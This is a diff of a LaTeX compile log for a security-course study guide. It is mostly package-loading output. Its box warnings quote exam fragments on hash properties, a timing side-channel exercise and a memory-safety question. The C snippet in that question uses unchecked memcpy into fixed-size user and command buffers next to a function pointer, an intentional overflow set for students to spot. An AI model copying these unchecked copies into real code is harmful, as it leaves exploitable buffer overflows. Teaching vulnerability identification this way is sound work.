@@ -1,4 +1,4 @@
-This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025) (preloaded format=pdflatex 2026.1.26)  13 OCT 2026 04:40
+This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025) (preloaded format=pdflatex 2026.1.26)  14 OCT 2026 01:47
 entering extended mode
  restricted \write18 enabled.
  %&-line parsing enabled.
@@ -203,6 +203,37 @@ Package: infwarerr 2019/12/03 v1.5 Providing info/warning/error messages (HO)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/etexcmds/etexcmds.sty
 Package: etexcmds 2019/12/15 v1.7 Avoid name clashes with e-TeX commands (HO)
 ))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/setspace/setspace.sty
+Package: setspace 2022/12/04 v6.7b set line spacing
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/parskip/parskip.sty
+Package: parskip 2021-03-14 v2.0h non-zero parskip adjustments
+
+(/usr/local/texlive/2025/texmf-dist/tex/latex/kvoptions/kvoptions.sty
+Package: kvoptions 2022-06-15 v3.15 Key value format for package options (HO)
+
+(/usr/local/texlive/2025/texmf-dist/tex/generic/ltxcmds/ltxcmds.sty
+Package: ltxcmds 2023-12-04 v1.26 LaTeX kernel commands for general use (HO)
+)
+(/usr/local/texlive/2025/texmf-dist/tex/latex/kvsetkeys/kvsetkeys.sty
+Package: kvsetkeys 2022-10-05 v1.19 Key value parser (HO)
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/etoolbox/etoolbox.sty
+Package: etoolbox 2025/10/02 v2.5m e-TeX tools for LaTeX (JAW)
+\etb@tempcnta=\count304
+))
+(/usr/local/texlive/2025/texmf-dist/tex/latex/titlesec/titlesec.sty
+Package: titlesec 2025/01/04 v2.17 Sectioning titles
+\ttl@box=\box56
+\beforetitleunit=\skip59
+\aftertitleunit=\skip60
+\ttl@plus=\dimen176
+\ttl@minus=\dimen177
+\ttl@toksa=\toks37
+\titlewidth=\dimen178
+\titlewidthlast=\dimen179
+\titlewidthfirst=\dimen180
+)
 (/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcolorbox.sty
 Package: tcolorbox 2025/11/28 version 6.9.0 text color boxes
 
@@ -211,12 +242,12 @@ Package: tcolorbox 2025/11/28 version 6.9.0 text color boxes
 (/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/utilities/pgfrcs.sty
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfutil-common.te
 x
-\pgfutil@everybye=\toks37
-\pgfutil@tempdima=\dimen176
-\pgfutil@tempdimb=\dimen177
+\pgfutil@everybye=\toks38
+\pgfutil@tempdima=\dimen181
+\pgfutil@tempdimb=\dimen182
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfutil-latex.def
-\pgfutil@abb=\box56
+\pgfutil@abb=\box57
 ) (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfrcs.code.tex
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/pgf.revision.tex)
 Package: pgfrcs 2025-08-29 v3.1.11a (3.1.11a)
@@ -238,40 +269,40 @@ File: graphics.cfg 2016/06/04 v1.11 sample graphics configuration
 )
 Package graphics Info: Driver file: pdftex.def on input line 106.
 )
-\Gin@req@height=\dimen178
-\Gin@req@width=\dimen179
+\Gin@req@height=\dimen183
+\Gin@req@width=\dimen184
 )
 (/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/systemlayer/pgfsys.sty
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsys.code.tex
 Package: pgfsys 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfkeys.code.tex
-\pgfkeys@pathtoks=\toks38
-\pgfkeys@temptoks=\toks39
+\pgfkeys@pathtoks=\toks39
+\pgfkeys@temptoks=\toks40
 
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgfkeyslibraryfil
 tered.code.tex
-\pgfkeys@tmptoks=\toks40
+\pgfkeys@tmptoks=\toks41
 ))
-\pgf@x=\dimen180
-\pgf@y=\dimen181
-\pgf@xa=\dimen182
-\pgf@ya=\dimen183
-\pgf@xb=\dimen184
-\pgf@yb=\dimen185
-\pgf@xc=\dimen186
-\pgf@yc=\dimen187
-\pgf@xd=\dimen188
-\pgf@yd=\dimen189
+\pgf@x=\dimen185
+\pgf@y=\dimen186
+\pgf@xa=\dimen187
+\pgf@ya=\dimen188
+\pgf@xb=\dimen189
+\pgf@yb=\dimen190
+\pgf@xc=\dimen191
+\pgf@yc=\dimen192
+\pgf@xd=\dimen193
+\pgf@yd=\dimen194
 \w@pgf@writea=\write3
 \r@pgf@reada=\read2
-\c@pgf@counta=\count304
-\c@pgf@countb=\count305
-\c@pgf@countc=\count306
-\c@pgf@countd=\count307
-\t@pgf@toka=\toks41
-\t@pgf@tokb=\toks42
-\t@pgf@tokc=\toks43
-\pgf@sys@id@count=\count308
+\c@pgf@counta=\count305
+\c@pgf@countb=\count306
+\c@pgf@countc=\count307
+\c@pgf@countd=\count308
+\t@pgf@toka=\toks42
+\t@pgf@tokb=\toks43
+\t@pgf@tokc=\toks44
+\pgf@sys@id@count=\count309
 
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgf.cfg
 File: pgf.cfg 2025-08-29 v3.1.11a (3.1.11a)
@@ -289,8 +320,8 @@ File: pgfsys-common-pdf.def 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsyssoftpath.
 code.tex
 File: pgfsyssoftpath.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgfsyssoftpath@smallbuffer@items=\count309
-\pgfsyssoftpath@bigbuffer@items=\count310
+\pgfsyssoftpath@smallbuffer@items=\count310
+\pgfsyssoftpath@bigbuffer@items=\count311
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/systemlayer/pgfsysprotocol.
 code.tex
@@ -301,12 +332,12 @@ Package: pgfcore 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathutil.code.tex)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathparser.code.tex
-\pgfmath@dimen=\dimen190
-\pgfmath@count=\count311
-\pgfmath@box=\box57
-\pgfmath@toks=\toks44
-\pgfmath@stack@operand=\toks45
-\pgfmath@stack@operation=\toks46
+\pgfmath@dimen=\dimen195
+\pgfmath@count=\count312
+\pgfmath@box=\box58
+\pgfmath@toks=\toks45
+\pgfmath@stack@operand=\toks46
+\pgfmath@stack@operation=\toks47
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfunctions.code.
 tex)
@@ -328,57 +359,57 @@ code.tex)
 erarithmetics.code.tex)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathcalc.code.tex)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmathfloat.code.tex
-\c@pgfmathroundto@lastzeros=\count312
+\c@pgfmathroundto@lastzeros=\count313
 )) (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfint.code.tex)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepoints.co
 de.tex
 File: pgfcorepoints.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@picminx=\dimen191
-\pgf@picmaxx=\dimen192
-\pgf@picminy=\dimen193
-\pgf@picmaxy=\dimen194
-\pgf@pathminx=\dimen195
-\pgf@pathmaxx=\dimen196
-\pgf@pathminy=\dimen197
-\pgf@pathmaxy=\dimen198
-\pgf@xx=\dimen199
-\pgf@xy=\dimen256
-\pgf@yx=\dimen257
-\pgf@yy=\dimen258
-\pgf@zx=\dimen259
-\pgf@zy=\dimen260
+\pgf@picminx=\dimen196
+\pgf@picmaxx=\dimen197
+\pgf@picminy=\dimen198
+\pgf@picmaxy=\dimen199
+\pgf@pathminx=\dimen256
+\pgf@pathmaxx=\dimen257
+\pgf@pathminy=\dimen258
+\pgf@pathmaxy=\dimen259
+\pgf@xx=\dimen260
+\pgf@xy=\dimen261
+\pgf@yx=\dimen262
+\pgf@yy=\dimen263
+\pgf@zx=\dimen264
+\pgf@zy=\dimen265
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathconst
 ruct.code.tex
 File: pgfcorepathconstruct.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@path@lastx=\dimen261
-\pgf@path@lasty=\dimen262
+\pgf@path@lastx=\dimen266
+\pgf@path@lasty=\dimen267
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorepathusage
 .code.tex
 File: pgfcorepathusage.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@shorten@end@additional=\dimen263
-\pgf@shorten@start@additional=\dimen264
+\pgf@shorten@end@additional=\dimen268
+\pgf@shorten@start@additional=\dimen269
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorescopes.co
 de.tex
 File: pgfcorescopes.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgfpic=\box58
-\pgf@hbox=\box59
-\pgf@layerbox@main=\box60
-\pgf@picture@serial@count=\count313
+\pgfpic=\box59
+\pgf@hbox=\box60
+\pgf@layerbox@main=\box61
+\pgf@picture@serial@count=\count314
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoregraphicst
 ate.code.tex
 File: pgfcoregraphicstate.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgflinewidth=\dimen265
+\pgflinewidth=\dimen270
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoretransform
 ations.code.tex
 File: pgfcoretransformations.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@pt@x=\dimen266
-\pgf@pt@y=\dimen267
-\pgf@pt@temp=\dimen268
+\pgf@pt@x=\dimen271
+\pgf@pt@y=\dimen272
+\pgf@pt@temp=\dimen273
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorequick.cod
 e.tex
@@ -395,14 +426,14 @@ File: pgfcorepathprocessing.code.tex 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorearrows.co
 de.tex
 File: pgfcorearrows.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgfarrowsep=\dimen269
+\pgfarrowsep=\dimen274
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreshade.cod
 e.tex
 File: pgfcoreshade.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@max=\dimen270
-\pgf@sys@shading@range@num=\count314
-\pgf@shadingcount=\count315
+\pgf@max=\dimen275
+\pgf@sys@shading@range@num=\count315
+\pgf@shadingcount=\count316
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreimage.cod
 e.tex
@@ -411,7 +442,7 @@ File: pgfcoreimage.code.tex 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcoreexternal.
 code.tex
 File: pgfcoreexternal.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgfexternal@startupbox=\box61
+\pgfexternal@startupbox=\box62
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/basiclayer/pgfcorelayers.co
 de.tex
@@ -432,7 +463,7 @@ File: pgfcorerdf.code.tex 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/modules/pgfmoduleshapes.cod
 e.tex
 File: pgfmoduleshapes.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgfnodeparttextbox=\box62
+\pgfnodeparttextbox=\box63
 )
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/modules/pgfmoduleplot.code.
 tex
@@ -441,8 +472,8 @@ File: pgfmoduleplot.code.tex 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version
 -0-65.sty
 Package: pgfcomp-version-0-65 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@nodesepstart=\dimen271
-\pgf@nodesepend=\dimen272
+\pgf@nodesepstart=\dimen276
+\pgf@nodesepend=\dimen277
 )
 (/usr/local/texlive/2025/texmf-dist/tex/latex/pgf/compatibility/pgfcomp-version
 -1-18.sty
@@ -455,10 +486,10 @@ Package: pgfcomp-version-1-18 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/math/pgfmath.code.tex))
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/utilities/pgffor.code.tex
 Package: pgffor 2025-08-29 v3.1.11a (3.1.11a)
-\pgffor@iter=\dimen273
-\pgffor@skip=\dimen274
-\pgffor@stack=\toks47
-\pgffor@toks=\toks48
+\pgffor@iter=\dimen278
+\pgffor@skip=\dimen279
+\pgffor@stack=\toks48
+\pgffor@toks=\toks49
 ))
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/frontendlayer/tikz/tikz.cod
 e.tex
@@ -467,34 +498,34 @@ Package: tikz 2025-08-29 v3.1.11a (3.1.11a)
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/libraries/pgflibraryplothan
 dlers.code.tex
 File: pgflibraryplothandlers.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgf@plot@mark@count=\count316
-\pgfplotmarksize=\dimen275
+\pgf@plot@mark@count=\count317
+\pgfplotmarksize=\dimen280
 )
-\tikz@lastx=\dimen276
-\tikz@lasty=\dimen277
-\tikz@lastxsaved=\dimen278
-\tikz@lastysaved=\dimen279
-\tikz@lastmovetox=\dimen280
-\tikz@lastmovetoy=\dimen281
-\tikzleveldistance=\dimen282
-\tikzsiblingdistance=\dimen283
-\tikz@figbox=\box63
-\tikz@figbox@bg=\box64
-\tikz@tempbox=\box65
-\tikz@tempbox@bg=\box66
-\tikztreelevel=\count317
-\tikznumberofchildren=\count318
-\tikznumberofcurrentchild=\count319
-\tikz@fig@count=\count320
+\tikz@lastx=\dimen281
+\tikz@lasty=\dimen282
+\tikz@lastxsaved=\dimen283
+\tikz@lastysaved=\dimen284
+\tikz@lastmovetox=\dimen285
+\tikz@lastmovetoy=\dimen286
+\tikzleveldistance=\dimen287
+\tikzsiblingdistance=\dimen288
+\tikz@figbox=\box64
+\tikz@figbox@bg=\box65
+\tikz@tempbox=\box66
+\tikz@tempbox@bg=\box67
+\tikztreelevel=\count318
+\tikznumberofchildren=\count319
+\tikznumberofcurrentchild=\count320
+\tikz@fig@count=\count321
 
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/modules/pgfmodulematrix.cod
 e.tex
 File: pgfmodulematrix.code.tex 2025-08-29 v3.1.11a (3.1.11a)
-\pgfmatrixcurrentrow=\count321
-\pgfmatrixcurrentcolumn=\count322
-\pgf@matrix@numberofcolumns=\count323
+\pgfmatrixcurrentrow=\count322
+\pgfmatrixcurrentcolumn=\count323
+\pgf@matrix@numberofcolumns=\count324
 )
-\tikz@expandcount=\count324
+\tikz@expandcount=\count325
 
 (/usr/local/texlive/2025/texmf-dist/tex/generic/pgf/frontendlayer/tikz/librarie
 s/tikzlibrarytopaths.code.tex
@@ -502,8 +533,8 @@ File: tikzlibrarytopaths.code.tex 2025-08-29 v3.1.11a (3.1.11a)
 )))
 (/usr/local/texlive/2025/texmf-dist/tex/latex/tools/verbatim.sty
 Package: verbatim 2024-01-22 v1.5x LaTeX2e package for verbatim enhancements
-\every@verbatim=\toks49
-\verbatim@line=\toks50
+\every@verbatim=\toks50
+\verbatim@line=\toks51
 \verbatim@in@stream=\read3
 )
 (/usr/local/texlive/2025/texmf-dist/tex/latex/environ/environ.sty
@@ -512,23 +543,19 @@ Package: environ 2014/05/04 v0.3 A new way to define environments
 (/usr/local/texlive/2025/texmf-dist/tex/latex/trimspaces/trimspaces.sty
 Package: trimspaces 2009/09/17 v1.1 Trim spaces around a token list
 ))
-(/usr/local/texlive/2025/texmf-dist/tex/latex/etoolbox/etoolbox.sty
-Package: etoolbox 2025/10/02 v2.5m e-TeX tools for LaTeX (JAW)
-\etb@tempcnta=\count325
-)
-\tcb@titlebox=\box67
-\tcb@upperbox=\box68
-\tcb@lowerbox=\box69
-\tcb@phantombox=\box70
+\tcb@titlebox=\box68
+\tcb@upperbox=\box69
+\tcb@lowerbox=\box70
+\tcb@phantombox=\box71
 \c@tcbbreakpart=\count326
 \c@tcblayer=\count327
 \c@tcolorbox@number=\count328
-\l__tcobox_tmpa_box=\box71
-\l__tcobox_tmpa_dim=\dimen284
-\tcb@temp=\box72
+\l__tcobox_tmpa_box=\box72
+\l__tcobox_tmpa_dim=\dimen289
 \tcb@temp=\box73
 \tcb@temp=\box74
 \tcb@temp=\box75
+\tcb@temp=\box76
 )
 (/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcbskins.code.tex
 Library (tcolorbox): 'tcbskins.code.tex' version '6.9.0'
@@ -541,7 +568,7 @@ Package: tikzfill-common 2023/08/08 v1.0.1 Auxiliary code for tikzfill
 (/usr/local/texlive/2025/texmf-dist/tex/latex/tikzfill/tikzlibraryfill.image.co
 de.tex
 File: tikzlibraryfill.image.code.tex 2023/08/08 v1.0.1 Image filling library
-\l__tikzfill_img_box=\box76
+\l__tikzfill_img_box=\box77
 ))
 (/usr/local/texlive/2025/texmf-dist/tex/latex/tcolorbox/tcbskinsjigsaw.code.tex
 Library (tcolorbox): 'tcbskinsjigsaw.code.tex' version '6.9.0'
@@ -550,14 +577,11 @@ Library (tcolorbox): 'tcbskinsjigsaw.code.tex' version '6.9.0'
 Library (tcolorbox): 'tcbbreakable.code.tex' version '6.9.0'
 (/usr/local/texlive/2025/texmf-dist/tex/latex/pdfcol/pdfcol.sty
 Package: pdfcol 2022-09-21 v1.7 Handle new color stacks for pdfTeX (HO)
-
-(/usr/local/texlive/2025/texmf-dist/tex/generic/ltxcmds/ltxcmds.sty
-Package: ltxcmds 2023-12-04 v1.26 LaTeX kernel commands for general use (HO)
-))
+)
 Package pdfcol Info: New color stack `tcb@breakable' = 1 on input line 23.
-\tcb@testbox=\box77
-\tcb@totalupperbox=\box78
-\tcb@totallowerbox=\box79
+\tcb@testbox=\box78
+\tcb@totalupperbox=\box79
+\tcb@totallowerbox=\box80
 )
 \enitdp@tightitem=\count329
 
@@ -568,20 +592,20 @@ File: l3backend-pdftex.def 2025-10-09 L3 backend support: PDF output (pdfTeX)
 (./study_guide.aux)
 \openout1 = `study_guide.aux'.
 
-LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
-LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
-LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
-LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
-LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
-LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
-LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 66.
-LaTeX Font Info:    ... okay on input line 66.
+LaTeX Font Info:    Checking defaults for OML/cmm/m/it on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
+LaTeX Font Info:    Checking defaults for OMS/cmsy/m/n on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
+LaTeX Font Info:    Checking defaults for OT1/cmr/m/n on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
+LaTeX Font Info:    Checking defaults for T1/cmr/m/n on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
+LaTeX Font Info:    Checking defaults for TS1/cmr/m/n on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
+LaTeX Font Info:    Checking defaults for OMX/cmex/m/n on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
+LaTeX Font Info:    Checking defaults for U/cmr/m/n on input line 131.
+LaTeX Font Info:    ... okay on input line 131.
 
 *geometry* driver: auto-detecting
 *geometry* detected driver: pdftex
@@ -620,16 +644,16 @@ LaTeX Font Info:    ... okay on input line 66.
 (/usr/local/texlive/2025/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
 [Loading MPS to PDF converter (version 2006.09.02).]
 \scratchcounter=\count331
-\scratchdimen=\dimen285
-\scratchbox=\box80
+\scratchdimen=\dimen290
+\scratchbox=\box81
 \nofMPsegments=\count332
 \nofMParguments=\count333
-\everyMPshowfont=\toks51
+\everyMPshowfont=\toks52
 \MPscratchCnt=\count334
-\MPscratchDim=\dimen286
+\MPscratchDim=\dimen291
 \MPnumerator=\count335
 \makeMPintoPDFobject=\count336
-\everyMPtoPDFconversion=\toks52
+\everyMPtoPDFconversion=\toks53
 ) (/usr/local/texlive/2025/texmf-dist/tex/latex/epstopdf-pkg/epstopdf-base.sty
 Package: epstopdf-base 2020-01-24 v2.11 Base part for package epstopdf
 Package epstopdf-base Info: Redefining graphics rule for `.eps' on input line 4
@@ -639,14 +663,14 @@ Package epstopdf-base Info: Redefining graphics rule for `.eps' on input line 4
 File: epstopdf-sys.cfg 2010/07/13 v1.3 Configuration of (r)epstopdf for TeX Liv
 e
 ))
-LaTeX Font Info:    Trying to load font information for U+msa on input line 71.
-
+LaTeX Font Info:    Trying to load font information for U+msa on input line 136
+.
 
 (/usr/local/texlive/2025/texmf-dist/tex/latex/amsfonts/umsa.fd
 File: umsa.fd 2013/01/14 v3.01 AMS symbols A
 )
-LaTeX Font Info:    Trying to load font information for U+msb on input line 71.
-
+LaTeX Font Info:    Trying to load font information for U+msb on input line 136
+.
 
 (/usr/local/texlive/2025/texmf-dist/tex/latex/amsfonts/umsb.fd
 File: umsb.fd 2013/01/14 v3.01 AMS symbols B
@@ -670,425 +694,532 @@ r-mea-sure/responsibility
  [1
 
 {/usr/local/texlive/2025/texmf-var/fonts/map/pdftex/updmap/pdftex.map}]
+Overfull \hbox (3.55037pt too wide) in paragraph at lines 157--158
+[]\OT1/cmr/bx/it/12 Weak col-li-sion re-sis-tance (second-preimage re-sis-tance
+)\OT1/cmr/m/n/12 : the chal-lenger hands
+ []
+
 [2{/usr/local/texlive/2025/texmf-dist/fonts/enc/dvips/cm-super/cm-super-ts1.enc
-}] [3] [4] [5] [6] [7] [8]
-Underfull \hbox (badness 2035) in paragraph at lines 170--171
-\OT1/cmr/m/n/12 tion). Sup-pose $\OML/cmm/m/it/12 H$ \OT1/cmr/m/n/12 were NOT o
-ne-way, i.e. there is an ef-fi-cient
+}] [3] [4] [5] [6] [7] [8] [9] [10] [11] [12] [13] [14] [15] [16] [17] [18]
+[19]
+Underfull \hbox (badness 10000) in paragraph at lines 588--595
+[]\OT1/cmtt/m/n/10.95 (1) r = 0; (2) r += A[u]; (3) if (v == 1)  (4) r += B[q];
+  else  (5)
  []
 
-
-Underfull \hbox (badness 1189) in paragraph at lines 170--171
-\OT1/cmr/m/n/12 func-tion $\OML/cmm/m/it/12 g$ \OT1/cmr/m/n/12 with $\OML/cmm/m
-/it/12 H\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 g\OT1/cmr/m/n/12 (\OML/cmm/m/it/12 h\
-OT1/cmr/m/n/12 )) = \OML/cmm/m/it/12 h$ \OT1/cmr/m/n/12 for ev-ery di-gest $\OM
-L/cmm/m/it/12 h$\OT1/cmr/m/n/12 . De-fine $\OML/cmm/m/it/12 f\OT1/cmr/m/n/12 (\
-OML/cmm/m/it/12 h\OT1/cmr/m/n/12 ) =
- []
-
-[9] [10] [11] [12] [13] [14]
-LaTeX Font Info:    Trying to load font information for OMS+cmtt on input line 
-247.
-LaTeX Font Info:    No file OMScmtt.fd. on input line 247.
-
-
-LaTeX Font Warning: Font shape `OMS/cmtt/m/n' undefined
-(Font)              using `OMS/cmsy/m/n' instead
-(Font)              for symbol `textbraceleft' on input line 247.
-
-[15]
-Overfull \hbox (5.91121pt too wide) in paragraph at lines 254--255
+[20]
+Overfull \hbox (5.91121pt too wide) in paragraph at lines 625--628
 []\OT1/cmr/m/it/12 Applying Step 4 (tab-u-late and cor-re-late runs): \OT1/cmr/
-m/n/12 The at-tacker sweeps all $\OML/cmm/m/it/12 q \OMS/cmtt/m/n/12 2 f\OT1/cm
-r/m/n/12 0\OML/cmm/m/it/12 ; [] ; \OT1/cmr/m/n/12 31\OMS/cmtt/m/n/12 g$
+m/n/12 The at-tacker sweeps all $\OML/cmm/m/it/12 q \OMS/cmsy/m/n/12 2 f\OT1/cm
+r/m/n/12 0\OML/cmm/m/it/12 ; [] ; \OT1/cmr/m/n/12 31\OMS/cmsy/m/n/12 g$
  []
 
-[16] [17] [18] [19] [20]
-Overfull \hbox (32.43109pt too wide) in paragraph at lines 306--307
+[21] [22]
+
+Package tcolorbox Warning: Using nobreak failed. Try to enlarge `lines before b
+reak' or set page breaks manually on input line 691.
+
+[23]
+Underfull \hbox (badness 10000) in paragraph at lines 697--702
+[]\OT1/cmtt/m/n/10.95 (1) int C = 0; (2) if (D < 64)  (4) C += M[(D + A)/2]; (5
+) C +=
+ []
+
+[24] [25]
+Overfull \hbox (14.80627pt too wide) in paragraph at lines 736--737
 []\OT1/cmr/m/it/12 For more prac-tice, see past-exam in-stances: \OT1/cmr/m/n/1
 2 re-exam-problems-with-sample-solutions.pdf::7b 
  []
 
 
-Overfull \hbox (12.2878pt too wide) in paragraph at lines 308--308
-[]\OT1/cmr/bx/n/17.28 Question Type 3: Memory-safety vul-ner-a-bil-ity iden-
+Overfull \hbox (8.39986pt too wide) in paragraph at lines 738--738
+|[]\OT1/cmr/bx/n/17.28 Question Type 3: Memory-safety vul-ner-a-bil-ity iden-
  []
 
-[21] [22]
-Underfull \hbox (badness 10000) in paragraph at lines 338--338
-[]\OT1/cmtt/m/n/12 memcpy(dst, src, len) \OT1/cmr/m/n/12 with attacker-controll
-ed $[] \OML/cmm/m/it/12 >
- []
-
-
-Underfull \hbox (badness 10000) in paragraph at lines 340--340
+[26] [27] [28] [29]
+Underfull \hbox (badness 10000) in paragraph at lines 840--841
 []\OT1/cmr/m/n/12 the saved re-turn ad-dress, reached with $[] +
  []
 
-[23] [24]
-Overfull \hbox (14.25336pt too wide) in paragraph at lines 358--359
-\OT1/cmtt/m/n/12 session \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char user[16]; voi
-d (*on[]done)(void); \OMS/cmtt/m/n/12 g\OT1/cmtt/m/n/12 ; void enroll(char *pac
-ket,
+[30] [31]
+LaTeX Font Info:    Trying to load font information for OMS+cmtt on input line 
+881.
+LaTeX Font Info:    No file OMScmtt.fd. on input line 881.
+
+
+LaTeX Font Warning: Font shape `OMS/cmtt/m/n' undefined
+(Font)              using `OMS/cmsy/m/n' instead
+(Font)              for symbol `textbraceleft' on input line 881.
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 881--892
+[]\OT1/cmtt/m/n/10.95 struct session \OMS/cmtt/m/n/10.95 f \OT1/cmtt/m/n/10.95 
+char user[16]; void (*on[]done)(void); \OMS/cmtt/m/n/10.95 g\OT1/cmtt/m/n/10.95
+ ;
  []
 
 
-Overfull \hbox (32.95335pt too wide) in paragraph at lines 358--359
-\OT1/cmtt/m/n/12 unsigned plen) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 struct sess
-ion *s = malloc(sizeof(struct session)); s->on[]done
+Underfull \hbox (badness 10000) in paragraph at lines 881--892
+\OT1/cmtt/m/n/10.95 void enroll(char *packet, unsigned plen) \OMS/cmtt/m/n/10.9
+5 f \OT1/cmtt/m/n/10.95 struct session
  []
 
 
-Overfull \hbox (25.22433pt too wide) in paragraph at lines 358--359
-\OT1/cmtt/m/n/12 = log[]close; memcpy(s->user, packet, plen); /* Line A */ s->o
-n[]done(); /* Line
+Underfull \hbox (badness 10000) in paragraph at lines 881--892
+\OT1/cmtt/m/n/10.95 *s = malloc(sizeof(struct session)); s->on[]done = log[]clo
+se;
  []
 
 
-Overfull \hbox (22.15736pt too wide) in paragraph at lines 358--359
-\OT1/cmtt/m/n/12 B */ \OMS/cmtt/m/n/12 g \OT1/cmtt/m/n/12 void dispatch(char *p
-acket, unsigned plen) \OMS/cmtt/m/n/12 f \OT1/cmtt/m/n/12 char cmd[24]; memcpy(
-cmd,
+Underfull \hbox (badness 10000) in paragraph at lines 881--892
+\OT1/cmtt/m/n/10.95 memcpy(s->user, packet, plen); /* Line A */ s->on[]done(); 
+/* Line
  []
 
 
-Overfull \hbox (2.25333pt too wide) in paragraph at lines 358--359
-\OT1/cmtt/m/n/12 packet, plen); /* Line C */ exec[]cmd(cmd); /* Line D: unknown
- commands are
+Underfull \hbox (badness 10000) in paragraph at lines 881--892
+\OT1/cmtt/m/n/10.95 B */ \OMS/cmtt/m/n/10.95 g \OT1/cmtt/m/n/10.95 void dispatc
+h(char *packet, unsigned plen) \OMS/cmtt/m/n/10.95 f \OT1/cmtt/m/n/10.95 char c
+md[24];
  []
 
 
-Overfull \hbox (12.4116pt too wide) in paragraph at lines 358--359
